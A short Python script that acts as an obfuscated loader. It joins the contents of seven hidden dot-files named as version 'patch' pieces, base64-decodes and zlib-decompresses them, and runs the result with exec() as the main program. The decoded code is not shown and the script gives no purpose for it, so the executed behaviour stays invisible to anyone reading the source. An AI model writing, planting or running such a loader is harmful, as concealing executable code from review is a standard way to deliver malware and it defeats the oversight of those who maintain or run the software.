from pathlib import Path
import base64
import zlib

HERE = Path(__file__).resolve().parent
blob = ''.join((HERE / f'.v261_patch_{i:02d}').read_text(encoding='utf-8').strip() for i in range(7))
code = zlib.decompress(base64.b64decode(blob)).decode('utf-8')
exec(compile(code, str(Path(__file__)), 'exec'), {'__file__': str(Path(__file__)), '__name__': '__main__'})
